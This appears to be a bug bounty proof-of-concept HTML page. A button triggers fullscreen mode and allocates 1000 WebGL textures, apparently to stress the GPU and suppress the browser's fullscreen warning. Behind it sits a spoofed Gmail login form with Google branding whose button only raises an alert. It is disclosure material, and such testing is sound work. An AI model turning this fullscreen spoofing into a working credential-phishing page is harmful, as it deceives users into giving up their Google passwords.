<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PoC - GPU Stress Fullscreen Test</title>
    <style>
        body, html { margin: 0; padding: 0; overflow: hidden; background: #202124; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; }

        #payload { display: none; color: white; text-align: center; padding-top: 10vh; }
        .warning-header { color: #ff4444; font-size: 1.2rem; margin-bottom: 20px; border-bottom: 1px solid #444; padding-bottom: 10px; }
        .login-box { background: white; color: #202124; width: 350px; margin: 0 auto; padding: 40px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
        input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
        button.login-btn { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; width: 100%; font-weight: bold; }

        #initial-ui { position: relative; z-index: 100; text-align: center; color: #0f0; padding-top: 20vh; }
        .attack-btn { padding: 50px; font-size: 30px; cursor: pointer; background: #111; color: #0f0; border: 5px double #0f0; }

        #gpu-log { position: fixed; bottom: 10px; left: 10px; color: #0f0; font-size: 12px; font-family: monospace; z-index: 999; display: none; }
    </style>
</head>
<body>

    <canvas id="glCanvas"></canvas>

    <div id="initial-ui">
        <h1>PoC - GPU Stress Only</h1>
        <p>Isolated Test: No history flood, no busy loop, no message flood</p>
        <button id="go" class="attack-btn">LAUNCH GPU STRESS PoC</button>
    </div>

    <div id="payload">
        <div class="warning-header">** (Bug Bounty) GPU Stress Isolated Test **</div>
        <div class="login-box">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92" alt="Google">
            <h3>POC</h3>
            <p>Gmail</p>
            <input type="text" placeholder="Email">
            <input type="password" placeholder="Password">
            <button class="login-btn" onclick="alert('PoC Success: GPU Stress Fullscreen Bypass')">Next</button>
        </div>
    </div>

    <div id="gpu-log"></div>

    <script>
        const btn = document.getElementById('go');
        const initialUI = document.getElementById('initial-ui');
        const payload = document.getElementById('payload');
        const canvas = document.getElementById('glCanvas');
        const gpuLog = document.getElementById('gpu-log');

        btn.onclick = () => {
            initialUI.style.display = 'none';
            payload.style.display = 'block';
            gpuLog.style.display = 'block';

            // Step 1: Request fullscreen (user gesture context)
            document.documentElement.requestFullscreen().then(() => {
                gpuLog.textContent = '[+] Fullscreen entered';
            }).catch(e => {
                gpuLog.textContent = '[-] Fullscreen failed: ' + e;
            });

            // Step 2: GPU Stress ONLY — isolated, no other primitives
            const gl = canvas.getContext('webgl');
            let texCount = 0;

            if (gl) {
                // Increase texture count significantly for Android stress test
                // Original: 300 — testing with 1000 for stronger GPU pressure
                const TARGET_TEX = 1000;

                const t0 = performance.now();
                for (let i = 0; i < TARGET_TEX; i++) {
                    const tex = gl.createTexture();
                    gl.bindTexture(gl.TEXTURE_2D, tex);
                    gl.texImage2D(
                        gl.TEXTURE_2D, 0, gl.RGBA, 2, 2, 0,
                        gl.RGBA, gl.UNSIGNED_BYTE,
                        new Uint8Array([255, 0, 0, 255, 255, 0, 0, 255, 255, 0, 0, 255, 255, 0, 0, 255])
                    );
                    texCount++;
                }
                const t1 = performance.now();

                gpuLog.textContent = `[+] GPU Stress: ${texCount} textures allocated in ${(t1 - t0).toFixed(2)}ms`;
            } else {
                gpuLog.textContent = '[-] WebGL not available';
            }
        };
    </script>
</body>
</html>
